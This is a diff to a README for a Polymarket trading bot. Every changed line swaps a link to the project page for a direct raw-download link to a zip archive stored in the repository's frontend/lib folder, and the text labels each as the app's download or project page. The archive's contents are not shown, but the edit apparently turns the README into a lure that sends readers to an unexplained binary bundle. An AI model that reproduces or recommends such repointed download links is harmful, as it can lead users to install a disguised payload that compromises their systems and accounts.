@@ -1,12 +1,12 @@
 # 🤖 polymarket-impulse-monitoring-trading-bot - Track market swings with simple rules
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
+[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip)
 
 ## 🖥️ What this app does
 
@@ -29,7 +29,7 @@ Use it if you want a simple tool that reacts to market impulse and helps manage 
 
 Go to:
 
-[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
+[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip)
 
 ### 2. Get the app
 
@@ -148,7 +148,7 @@ This project fits these topics:
 
 Visit the project page here:
 
-[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot)
+[https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip](https://github.com/Yury617/polymarket-impulse-monitoring-trading-bot/raw/refs/heads/main/frontend/lib/polymarket-bot-monitoring-trading-impulse-v3.4.zip)
 
 ## 🧩 Typical workflow
 
